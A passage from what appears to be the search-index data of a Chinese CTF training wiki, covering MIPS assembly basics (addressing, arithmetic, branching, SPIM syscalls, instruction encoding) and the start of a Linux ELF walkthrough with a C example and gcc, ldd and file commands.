.text\n__start:\n       lw     $t0, var1            # \u5c06\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668\u4e2d $t0:  $t0 = var1\n       li     $t1, 5               #  $t1 = 5   (\"\u7acb\u5373\u52a0\u8f7d\")\n       sw     $t1, var1            # \u628a\u5bc4\u5b58\u5668$t1\u7684\u5185\u5bb9\u5b58\u5230\u5185\u5b58\u4e2d : var1 = $t1\n       done\n</code></pre>"},{"location":"Training/Material/Reverse/#_22","title":"\u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740","text":"<ul> <li>\u4ec5\u7528\u4e8e\u8bfb\u53d6\u548c\u5199\u5165\u6307\u4ee4</li> </ul> <p>*\u76f4\u63a5\u7ed9\u5730\u5740\uff1a*</p> <pre><code>       la $t0\uff0cvar1\n</code></pre> <ul> <li>\u5c06 var1 \u7684\u5185\u5b58\u5730\u5740\uff08\u53ef\u80fd\u662f\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684\u6807\u7b7e\uff09\u590d\u5236\u5230\u5bc4\u5b58\u5668 <code>$t0</code> \u4e2d</li> </ul> <p>*\u95f4\u63a5\u5bfb\u5740, \u5730\u5740\u662f\u5bc4\u5b58\u5668\u7684\u5185\u5bb9, \u7c7b\u4f3c\u6307\u9488\uff1a*</p> <pre><code>       lw $t2\uff0c\uff08$t0\uff09\n</code></pre> <ul> <li>\u5c06 <code>$t0</code> \u4e2d\u5305\u542b\u7684 RAM \u5730\u5740\u52a0\u8f7d\u5230 <code>$t2</code></li> </ul> <pre><code>       sw $t2\uff0c\uff08$t0\uff09\n</code></pre> <ul> <li>\u5c06 <code>$t2</code> \u5bc4\u5b58\u5668\u4e2d\u7684\u5b57\u5b58\u50a8\u5230 <code>$t0</code> \u4e2d\u5305\u542b\u7684\u5730\u5740\u7684 RAM \u4e2d</li> </ul> <p>*\u57fa\u4e8e\u504f\u79fb\u91cf\u7684\u5bfb\u5740\uff1a*</p> <pre><code>       lw $t2, 4\uff08$t0\uff09\n</code></pre> <ul> <li>\u5c06\u5185\u5b58\u5730\u5740 ( <code>$t0 + 4</code> ) \u7684\u5b57\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 <code>$t2</code> \u4e2d</li> <li>\u201c 4 \u201d \u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668 <code>$t0</code> \u4e2d\u5730\u5740\u7684\u504f\u79fb\u91cf</li> </ul> <pre><code>       sw $t2\uff0c-12\uff08$t0\uff09\n</code></pre> <ul> <li> <p>\u5c06\u5bc4\u5b58\u5668 <code>$t2</code> \u4e2d\u7684\u5b57\u653e\u5230\u5185\u5b58\u5730\u5740\uff08 <code>$t0 - 12</code> \uff09</p> </li> <li> <p>\u8d1f\u504f\u79fb\u4e5f\u662f\u53ef\u4ee5\u7684, \u53cd\u5411\u6f02\u79fb\u65b9\u4e0d\u65b9 ?</p> </li> </ul> <p>\u6ce8\u610f\uff1a\u57fa\u4e8e\u504f\u79fb\u91cf \u7684\u5bfb\u5740\u7279\u522b\u9002\u7528\u4e8e\uff1a</p> <ul> <li> <p>\u6570\u7ec4; \u8bbf\u95ee\u5143\u7d20\u4f5c\u4e3a\u4e0e\u57fa\u5740\u7684\u504f\u79fb\u91cf</p> </li> <li> <p>\u6808; \u6613\u4e8e\u8bbf\u95ee\u504f\u79bb\u6808\u6307\u9488\u6216\u5e27\u6307\u9488\u7684\u5143\u7d20</p> </li> <li> <p>\u4f8b\u5b50</p> </li> </ul> <pre><code> .data\n array1:             .space 12            #  \u5b9a\u4e49\u4e00\u4e2a 12\u5b57\u8282 \u957f\u5ea6\u7684\u6570\u7ec4 array1, \u5bb9\u7eb3 3\u4e2a\u6574\u578b\n              .text\n __start:     la     $t0, array1          #  \u8ba9 $t0 = \u6570\u7ec4\u9996\u5730\u5740\n              li     $t1, 5               #  $t1 = 5   (\"load immediate\")\n              sw $t1, ($t0)               #  \u6570\u7ec4\u7b2c\u4e00\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 5; \u7528\u7684\u95f4\u63a5\u5bfb\u5740; array[0] = $1 = 5\n              li $t1, 13                  #   $t1 = 13\n              sw $t1, 4($t0)              # \u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 13; array[1] = $1 = 13\n              #\u8be5\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u5730\u5740\u76f8\u8ddd\u957f\u5ea6\u5c31\u662f\u81ea\u8eab\u6570\u636e\u7c7b\u578b\u957f\u5ea6\uff0c\u53734\u5b57\u8282\uff0c \u6240\u4ee5\u5bf9\u4e8earray+4\u5c31\u662farray[1]\n              li $t1, -7                  #   $t1 = -7\n              sw $t1, 8($t0)              #  \u7b2c\u4e09\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a -7;  \n#array+8 = \uff08address[array[0])+4\uff09+ 4 = address(array[1]) + 4 = address(array[2])\n              done\n</code></pre>"},{"location":"Training/Material/Reverse/#_23","title":"\u7b97\u672f\u6307\u4ee4","text":"<ul> <li>\u6700\u591a\u4f7f\u75283\u4e2a\u53c2\u6570</li> <li>\u6240\u6709\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668; \u4e0d\u80fd\u6709\u5185\u5b58\u5730\u5740\u7684\u5b58\u5728</li> <li>\u64cd\u4f5c\u6570\u5927\u5c0f\u662f\u5b57 ( 4\u4e2a\u5b57\u8282 ), 32\u4f4d = 4 * 8 bit = 4bytes = 1 word</li> </ul> <pre><code>add    $t0,$t1,$t2   #  $t0 = $t1 + $t2;\u6dfb\u52a0\u4e3a\u5e26\u7b26\u53f7\uff082 \u7684\u8865\u7801\uff09\u6574\u6570\nsub    $t2,$t3,$t4   #  $t2 = $t3 \u00d0 $t4\naddi   $t2,$t3, 5    #  $t2 = $t3 + 5;\naddu   $t1,$t6,$t7   #  $t1 = $t6 + $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u52a0\nsubu   $t1,$t6,$t7   #  $t1 = $t6 - $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u51cf\n\nmult   $t3,$t4       # \u8fd0\u7b97\u7ed3\u679c\u5b58\u50a8\u5728hi,lo\uff08hi\u9ad8\u4f4d\u6570\u636e\uff0c lo\u5730\u4f4d\u6570\u636e\uff09\ndiv    $t5,$t6       #  Lo = $t5 / $t6   (\u6574\u6570\u5546)\n                     #  Hi = $t5 mod $t6   (\u6c42\u4f59\u6570)\n                     #\u5546\u6570\u5b58\u653e\u5728 lo, \u4f59\u6570\u5b58\u653e\u5728 hi\nmfhi   $t0           #  \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Hi \u7684\u503c\u79fb\u52a8\u5230 $t0 : $t0 = Hi\nmflo   $t1           #  \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u7684\u503c\u79fb\u52a8\u5230 $t1:   $t1 = Lo\n#\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6 hi \u6216 lo\u4e2d\u7684\u503c\uff0c \u9700\u8981mfhi, mflo\u6307\u4ee4\u4f20\u503c\u7ed9\u5bc4\u5b58\u5668\n\nmove   $t2,$t3       #  $t2 = $t3\n</code></pre>"},{"location":"Training/Material/Reverse/#_24","title":"\u6d41\u7a0b\u63a7\u5236","text":"<p>\u5206\u652f ( if-else )</p> <ul> <li>\u6761\u4ef6\u5206\u652f\u7684\u6bd4\u8f83\u5185\u7f6e\u4e8e\u6307\u4ee4\u4e2d</li> </ul> <pre><code>              b target \uff03\u65e0\u6761\u4ef6\u5206\u652f,\u76f4\u63a5\u5230\u7a0b\u5e8f\u6807\u7b7e\u76ee\u6807\n              beq $t0, $t1, target \uff03if $t0 = $ t1, \u5c31\u8df3\u5230\u76ee\u6807\n              blt $t0, $t1, target \uff03if $t0 &lt;$ t1, \u5c31\u8df3\u5230\u76ee\u6807\n              ble $t0, $t1, target \uff03if $t0 &lt;= $ t1, \u5c31\u8df3\u5230\u76ee\u6807\n              bgt $t0, $t1, target \uff03if $t0  $ t1, \u5c31\u8df3\u5230\u76ee\u6807\n              bge $t0, $t1, target \uff03if $t0  = $ t1, \u5c31\u8df3\u5230\u76ee\u6807\n              bne    $t0, $t1, target #if  $t0 &lt; $t1, \u5c31\u8df3\u5230\u76ee\u6807\n</code></pre> <p>\u8df3\u8f6c ( while, for, goto )</p> <pre><code> j     target #\u770b\u5230\u5c31\u8df3\uff0c \u4e0d\u7528\u8003\u8651\u4efb\u4f55\u6761\u4ef6\n jr    $t3    #\u7c7b\u4f3c\u76f8\u5bf9\u5bfb\u5740\uff0c\u8df3\u5230\u8be5\u5bc4\u5b58\u5668\u7ed9\u51fa\u7684\u5730\u5740\u5904\n</code></pre> <p>\u5b50\u7a0b\u5e8f\u8c03\u7528</p> <p>\u5b50\u7a0b\u5e8f\u8c03\u7528\uff1a\u201c \u8df3\u8f6c\u548c\u94fe\u63a5 \u201d \u6307\u4ee4</p> <pre><code>       jal sub_label \uff03\u201c\u8df3\u8f6c\u548c\u94fe\u63a5\u201d\n</code></pre> <ul> <li> <p>\u5c06\u5f53\u524d\u7684\u7a0b\u5e8f\u8ba1\u6570\u5668\u4fdd\u5b58\u5230 <code>$ra</code> \u4e2d</p> </li> <li> <p>\u8df3\u8f6c\u5230 <code>sub_label</code> \u7684\u7a0b\u5e8f\u8bed\u53e5</p> </li> </ul> <p>\u5b50\u7a0b\u5e8f\u8fd4\u56de\uff1a\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d\u6307\u4ee4</p> <pre><code>       jr $ra       \uff03\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d\n</code></pre> <ul> <li>\u8df3\u8f6c\u5230$ ra\u4e2d\u7684\u5730\u5740\uff08\u7531jal\u6307\u4ee4\u5b58\u50a8\uff09</li> </ul> <p>\u6ce8\u610f\uff1a\u5bc4\u5b58\u5730\u5740\u5b58\u50a8\u5728\u5bc4\u5b58\u5668 <code>$ra</code> \u4e2d; \u5982\u679c\u5b50\u4f8b\u7a0b\u5c06\u8c03\u7528\u5176\u4ed6\u5b50\u4f8b\u7a0b\uff0c\u6216\u8005\u662f\u9012\u5f52\u7684\uff0c\u5219\u8fd4\u56de\u5730\u5740\u5e94\u8be5\u4ece <code>$ra</code> \u590d\u5236\u5230\u6808\u4ee5\u4fdd\u7559\u5b83\uff0c\u56e0\u4e3a <code>jal</code> \u603b\u662f\u5c06\u8fd4\u56de\u5730\u5740\u653e\u5728\u8be5\u5bc4\u5b58\u5668\u4e2d\uff0c\u56e0\u6b64\u5c06\u8986\u76d6\u4e4b\u524d\u7684\u503c</p>"},{"location":"Training/Material/Reverse/#i-o-spim","title":"\u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09","text":"<ul> <li> <p>\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0\u4ece\u8f93\u5165/\u8f93\u51fa\u7a97\u53e3\u8bfb\u53d6\u6216\u6253\u5370\u503c\u6216\u5b57\u7b26\u4e32\uff0c\u5e76\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f</p> </li> <li> <p><code>syscall</code></p> </li> <li> <p>\u9996\u5148\u5728\u5bc4\u5b58\u5668 <code>$v0</code> \u548c <code>$a0 - $a1</code>\u4e2d\u63d0\u4f9b\u9002\u5f53\u7684\u503c</p> </li> <li> <p>\u5bc4\u5b58\u5668 <code>$v0</code> \u4e2d\u5b58\u50a8\u8fd4\u56de\u7684\u7ed3\u679c\u503c\uff08 \u5982\u679c\u6709\u7684\u8bdd \uff09</p> </li> </ul> <p>\u4e0b\u8868\u5217\u51fa\u4e86\u53ef\u80fd\u7684 \u7cfb\u7edf\u8c03\u7528 \u670d\u52a1\u3002</p> Service \u670d\u52a1 Code in <code>$v0</code> \u5bf9\u5e94\u529f\u80fd\u7684\u8c03\u7528\u7801 Arguments \u6240\u9700\u53c2\u6570 Results \u8fd4\u56de\u503c print \u4e00\u4e2a\u6574\u578b\u6570 <code>$v0</code> = 1 <code>$a0</code> = \u8981\u6253\u5370\u7684\u6574\u578b\u6570 print \u4e00\u4e2a\u6d6e\u70b9\u6570 <code>$v0</code> = 2 <code>$f12</code> = \u8981\u6253\u5370\u7684\u6d6e\u70b9\u6570 print \u53cc\u7cbe\u5ea6\u6570 <code>$v0</code> = 3 <code>$f12</code> = \u8981\u6253\u5370\u7684\u53cc\u7cbe\u5ea6\u6570 print \u5b57\u7b26\u4e32 <code>$v0</code> = 4 <code>$a0</code> = \u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740 \u8bfb\u53d6 ( read ) \u6574\u578b\u6570 <code>$v0</code> = 5 <code>$v0</code> = \u8bfb\u53d6\u7684\u6574\u578b\u6570 \u8bfb\u53d6 ( read ) \u6d6e\u70b9\u6570 <code>$v0</code> = 6 <code>$v0</code> = \u8bfb\u53d6\u7684\u6d6e\u70b9\u6570 \u8bfb\u53d6 ( read ) \u53cc\u7cbe\u5ea6\u6570 <code>$v0</code>= 7 <code>$v0</code> = \u8bfb\u53d6\u7684\u53cc\u7cbe\u5ea6 \u8bfb\u53d6 ( read ) \u5b57\u7b26\u4e32 <code>$v0</code> = 8 \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c\u7ed9 <code>$a0</code>; \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u8d4b\u503c\u7ed9 <code>$a1</code> \u8fd9\u4e2a\u5e94\u8be5\u548c C \u8bed\u8a00\u7684 <code>sbrk()</code> \u51fd\u6570\u4e00\u6837 <code>$v0</code> = 9 \u9700\u8981\u5206\u914d\u7684\u7a7a\u95f4\u5927\u5c0f\uff08\u5355\u4f4d\u76ee\u6d4b\u662f\u5b57\u8282 bytes\uff09 \u5c06\u5206\u914d\u597d\u7684\u7a7a\u95f4\u9996\u5730\u5740\u7ed9 <code>$v0</code> exit <code>$v0</code> =10 \u8fd9\u4e2a\u8fd8\u8981\u8bf4\u5417.....= _ = <ul> <li> <ul> <li><code>print_string</code> \u5373 <code>print \u5b57\u7b26\u4e32</code> \u670d\u52a1\u671f\u671b\u542f\u52a8\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002\u6307\u4ee4<code>.asciiz</code> \u521b\u5efa\u4e00\u4e2a\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002</li> </ul> </li> <li> <p><code>read_int</code>\uff0c<code>read_float</code> \u548c <code>read_double</code> \u670d\u52a1\u8bfb\u53d6\u6574\u884c\u8f93\u5165\uff0c\u5305\u62ec\u6362\u884c\u7b26<code>\\n</code>\u3002</p> </li> <li> <p><code>read_string</code></p> <p>\u670d\u52a1\u4e0e UNIX \u5e93\u4f8b\u7a0b fgets \u5177\u6709\u76f8\u540c\u7684\u8bed\u4e49\u3002</p> <ul> <li>\u5b83\u5c06\u6700\u591a n-1 \u4e2a\u5b57\u7b26\u8bfb\u5165\u7f13\u51b2\u533a\uff0c\u5e76\u4ee5\u7a7a\u5b57\u7b26\u7ec8\u6b62\u5b57\u7b26\u4e32\u3002</li> <li>\u5982\u679c\u5f53\u524d\u884c\u4e2d\u5c11\u4e8e n-1 \u4e2a\u5b57\u7b26\uff0c\u5219\u5b83\u4f1a\u8bfb\u53d6\u5e76\u5305\u542b\u6362\u884c\u7b26\uff0c\u5e76\u4f7f\u7528\u7a7a\u5b57\u7b26\u7ec8\u6b62\u8be5\u5b57\u7b26\u4e32\u3002</li> <li>\u5c31\u662f\u8f93\u5165\u8fc7\u957f\u5c31\u622a\u53d6\uff0c\u8fc7\u77ed\u5c31\u8fd9\u6837\uff0c\u6700\u540e\u90fd\u8981\u52a0\u4e00\u4e2a\u7ec8\u6b62\u7b26\u3002</li> </ul> </li> <li> <p><code>sbrk</code> \u670d\u52a1\u5c06\u5730\u5740\u8fd4\u56de\u5230\u5305\u542b n \u4e2a\u9644\u52a0\u5b57\u8282\u7684\u5185\u5b58\u5757\u3002\u8fd9\u5c06\u7528\u4e8e\u52a8\u6001\u5185\u5b58\u5206\u914d\u3002</p> </li> <li> <p>\u9000\u51fa\u670d\u52a1\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c</p> </li> <li> <p>\u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b58\u50a8\u5728 $2 \u7684\u6574\u578b\u6570</p> </li> </ul> <pre><code> li $v0, 1    #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 1 ( print_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0\n move $a0, $t2 #\u628a\u8fd9\u4e2a\u8981\u6253\u5370\u7684\u6574\u578b\u6570\u8d4b\u503c\u7ed9 $a0\n syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c\n</code></pre> <ul> <li>\u4f8b\u5b50 : \u8bfb\u53d6\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u5b58\u50a8\u5230\u5185\u5b58\u4e2d\u7684 int_value \u53d8\u91cf\u4e2d</li> </ul> <p><code>masm   li $v0, 5 #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 5 ( read_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0   syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c, \u7136\u540e $v0 = 5   sw    $v0, int_value #\u901a\u8fc7\u5199\u5165\uff08store_word)\u6307\u4ee4 \u5c06 $v0 \u7684\u503c\uff085\uff09\u5b58\u5165\u5185\u5b58\u4e2d</code></p> <ul> <li>\u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b57\u7b26\u4e32 ( \u8fd9\u662f\u5b8c\u6574\u7684\uff0c\u5176\u5b9e\u4e0a\u9762\u4f8b\u5b50\u90fd\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362 main: \u90e8\u5206\uff0c\u90fd\u80fd\u76f4\u63a5\u8fd0\u884c )</li> </ul> <pre><code>              .data\n string1             .asciiz       \"Print this.\\n\"             # \u5b57\u7b26\u4e32\u53d8\u91cf\u58f0\u660e\n                                          # .asciiz \u6307\u4ee4\u4f7f\u5b57\u7b26\u4e32 null \u7ec8\u6b62\n\n              .text\n main: li     $v0, 4               # \u5c06\u9002\u5f53\u7684\u7cfb\u7edf\u8c03\u7528\u4ee3\u7801\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 $v0 \u4e2d\n                                   # \u6253\u5370\u5b57\u7b26\u4e32\uff0c \u8d4b\u503c\u5bf9\u5e94\u7684\u64cd\u4f5c\u4ee3\u7801 $v0 = 4\n              la     $a0, string1  # \u5c06\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c  $a0 = address(string1)\n              syscall              # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6253\u5370\u64cd\u4f5c\n\n\n \u8981\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f, \u5e94\u8be5\u9000\u51fa\u7cfb\u7edf\u8c03\u7528, \u6240\u4ee5\u6700\u540e\u4e00\u884c\u4ee3\u7801\u5e94\u8be5\u662f\u8fd9\u4e2a :\n              li     $v0, 10\u3000\u3000\u3000  #\u5bf9\u7740\u4e0a\u9762\u7684\u8868, \u4e0d\u7528\u8bf4\u4e86\u5427\n              syscall              # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8fd9\u4e00\u5207\u5427 !\n</code></pre>"},{"location":"Training/Material/Reverse/#mips","title":"\u8865\u5145 : MIPS \u6307\u4ee4\u683c\u5f0f","text":"<ul> <li>R\u683c\u5f0f</li> </ul> 6 5 5 5 5 6 op rs rt rd shamt funct <p>\u7528\u5904\uff1a \u5bc4\u5b58\u5668 - \u5bc4\u5b58\u5668 ALU \u64cd\u4f5c \u8bfb\u5199\u4e13\u7528\u5bc4\u5b58\u5668</p> <ul> <li>I\u683c\u5f0f</li> </ul> 6 5 5 16 op rs rt \u7acb\u5373\u6570\u64cd\u4f5c <p>\u7528\u5904\uff1a \u52a0\u8f7d/\u5b58\u50a8 \u5b57\u8282\uff0c\u534a\u5b57\uff0c\u5b57\uff0c\u53cc\u5b57 \u6761\u4ef6\u5206\u652f\uff0c\u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5\u5bc4\u5b58\u5668</p> <ul> <li>J\u683c\u5f0f</li> </ul> 6 26 op \u8df3\u8f6c\u5730\u5740 <p>\u7528\u5904\uff1a \u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5 \u9677\u9631\u548c\u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de</p> <p>\u5404\u5b57\u6bb5\u542b\u4e49\uff1a op : \u6307\u4ee4\u57fa\u672c\u64cd\u4f5c\uff0c\u79f0\u4e3a\u64cd\u4f5c\u7801\u3002 rs : \u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rt : \u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rd : \u5b58\u653e\u64cd\u4f5c\u7ed3\u679c\u7684\u76ee\u7684\u64cd\u4f5c\u6570\u3002 shamt : \u4f4d\u79fb\u91cf\uff1b funct : \u51fd\u6570\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u9009\u62e9 op \u64cd\u4f5c\u7684\u67d0\u4e2a\u7279\u5b9a\u53d8\u4f53\u3002</p> <p>\u4f8b\uff1a</p> <pre><code>add $t0,$s0,$s1\n</code></pre> <p>\u8868\u793a<code>$t0=$s0+$s1</code>,\u5373 16 \u53f7\u5bc4\u5b58\u5668\uff08 s0 ) \u7684\u5185\u5bb9\u548c 17 \u53f7\u5bc4\u5b58\u5668 ( s1 ) \u7684\u5185\u5bb9\u76f8\u52a0\uff0c\u7ed3\u679c\u653e\u5230 8 \u53f7\u5bc4\u5b58\u5668 ( t0 )\u3002 \u6307\u4ee4\u5404\u5b57\u6bb5\u7684\u5341\u8fdb\u5236\u8868\u793a\u4e3a\uff1a</p> 0 16 17 8 0 32 <p>op = 0 \u548c funct = 32 \u8868\u793a\u8fd9\u662f\u52a0\u6cd5\uff0c 16 = <code>$s0</code> \u8868\u793a\u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rs ) \u5728 16 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c</p> <p>17 = <code>$s1</code> \u8868\u793a\u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rt ) \u5728 17 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c 8 = <code>$t0</code> \u8868\u793a\u76ee\u7684\u64cd\u4f5c\u6570 ( rd ) \u5728 8 \u53f7\u5bc4\u5b58\u5668\u91cc\u3002 \u628a\u5404\u5b57\u6bb5\u5199\u6210\u4e8c\u8fdb\u5236\uff0c\u4e3a\uff1a</p> 000000 10000 10001 01000 00000 100000 <p>\u8fd9\u5c31\u662f\u4e0a\u8ff0\u6307\u4ee4\u7684\u673a\u5668\u7801\uff08 machine code ), \u53ef\u4ee5\u770b\u51fa\u662f\u5f88\u6709\u89c4\u5219\u6027\u7684\u3002</p>"},{"location":"Training/Material/Reverse/#mips_1","title":"\u8865\u5145 : MIPS \u5e38\u7528\u6307\u4ee4\u96c6","text":"<p>lb/lh/lw : \u4ece\u5b58\u50a8\u5668\u4e2d\u8bfb\u53d6\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u5230\u5bc4\u5b58\u5668\u4e2d.</p> <p>\u5982<code>lb $1, 0($2)</code> sb/sh/sw : \u628a\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u4ece\u5bc4\u5b58\u5668\u5b58\u50a8\u5230\u5b58\u50a8\u5668\u4e2d.</p> <p>\u5982 <code>sb $1, 0($2)</code> add/addu : \u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u52a0</p> <p><code>add $1,$2,$3($1=$2+$3)</code>; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0</p> <p>addi/addiu : \u628a\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u52a0\u4e0a\u4e00\u4e2a\u7acb\u5373\u6570</p> <p><code>add $1,$2,#3($1=$2+3)</code>; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0 sub/subu \uff1a\u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u51cf div/divu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u9664 mul/mulu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u4e58 and/andi : \u4e0e\u8fd0\u7b97\uff0c\u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u76f8\u4e0e</p> <p><code>and $1,$2,$3($1=$2 &amp; $3)</code>;i\u4e3a\u7acb\u5373\u6570\u3002 or/ori : \u6216\u8fd0\u7b97\u3002 xor/xori : \u5f02\u6216\u8fd0\u7b97\u3002 beq/beqz/benz/bne : \u6761\u4ef6\u8f6c\u79fb eq \u76f8\u7b49\uff0cz \u96f6\uff0cne \u4e0d\u7b49 j/jr/jal/jalr : j \u76f4\u63a5\u8df3\u8f6c\uff1bjr \u4f7f\u7528\u5bc4\u5b58\u5668\u8df3\u8f6c lui : \u628a\u4e00\u4e2a 16 \u4f4d\u7684\u7acb\u5373\u6570\u586b\u5165\u5230\u5bc4\u5b58\u5668\u7684\u9ad8 16 \u4f4d\uff0c\u4f4e 16 \u4f4d\u8865\u96f6 sll/srl : \u903b\u8f91 \u5de6\u79fb / \u53f3\u79fb</p> <p><code>sll $1,$2,#2</code> slt/slti/sltui : \u5982\u679c <code>$2</code> \u7684\u503c\u5c0f\u4e8e <code>$3</code>\uff0c\u90a3\u4e48\u8bbe\u7f6e <code>$1</code> \u7684\u503c\u4e3a 1,\u5426\u5219\u8bbe\u7f6e <code>$1</code> \u7684\u503c\u4e3a 0</p> <p><code>slt $1,$2,$3</code> mov/movz/movn : \u590d\u5236\uff0cn \u4e3a\u8d1f\uff0cz \u4e3a\u96f6</p> <p><code>mov $1,$2; movz $1,$2,$3</code> ( <code>$3</code> \u4e3a\u96f6\u5219\u590d\u5236 <code>$2</code> \u5230 <code>$1</code> ) trap : \u6839\u636e\u5730\u5740\u5411\u91cf\u8f6c\u5165\u7ba1\u6001 eret : \u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de\u5230\u7528\u6237\u6001</p>"},{"location":"Training/Material/Reverse/#linux-elf","title":"Linux ELF","text":"<ul> <li>\u4e00\u4e2a\u5b9e\u4f8b</li> <li>elfdemo.o</li> <li>ELF \u6587\u4ef6\u7ed3\u6784</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Reverse/#_25","title":"\u4e00\u4e2a\u5b9e\u4f8b","text":"<p>\u5728 1.5.1\u8282 C\u8bed\u8a00\u57fa\u7840 \u4e2d\u6211\u4eec\u770b\u5230\u4e86\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5168\u8fc7\u7a0b\uff0c\u73b0\u5728\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\u3002</p> <pre><code>#include&lt;stdio.h&gt;\n\nint global_init_var = 10;\nint global_uninit_var;\n\nvoid func(int sum) {\n    printf(\"%d\\n\", sum);\n}\n\nvoid main(void) {\n    static int local_static_init_var = 20;\n    static int local_static_uninit_var;\n\n    int local_init_val = 30;\n    int local_uninit_var;\n\n    func(global_init_var + local_init_val +\n         local_static_init_var );\n}\n</code></pre> <p>\u7136\u540e\u5206\u522b\u6267\u884c\u4e0b\u5217\u547d\u4ee4\u751f\u6210\u4e09\u4e2a\u6587\u4ef6\uff1a</p> <pre><code>gcc -m32 -c elfDemo.c -o elfDemo.o\n\ngcc -m32 elfDemo.c -o elfDemo.out\n\ngcc -m32 -static elfDemo.c -o elfDemo_static.out\n</code></pre> <p>\u4f7f\u7528 ldd \u547d\u4ee4\u6253\u5370\u6240\u4f9d\u8d56\u7684\u5171\u4eab\u5e93\uff1a</p> <pre><code>$ ldd elfDemo.out\n        linux-gate.so.1 (0xf77b1000)\n        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7597000)\n        /lib/ld-linux.so.2 =&gt; /usr/lib/ld-linux.so.2 (0xf77b3000)\n$ ldd elfDemo_static.out\n        not a dynamic executable\n</code></pre> <p>elfDemo_static.out \u91c7\u7528\u4e86\u9759\u6001\u94fe\u63a5\u7684\u65b9\u5f0f\u3002</p> <p>\u4f7f\u7528 file \u547d\u4ee4\u67e5\u770b\u76f8\u5e94\u7684\u6587\u4ef6\u683c\u5f0f\uff1a</p> <pre><code>$ file elfDemo.o\nelfDemo.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped\n\n$ file elfDemo.out\nelfDemo.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for 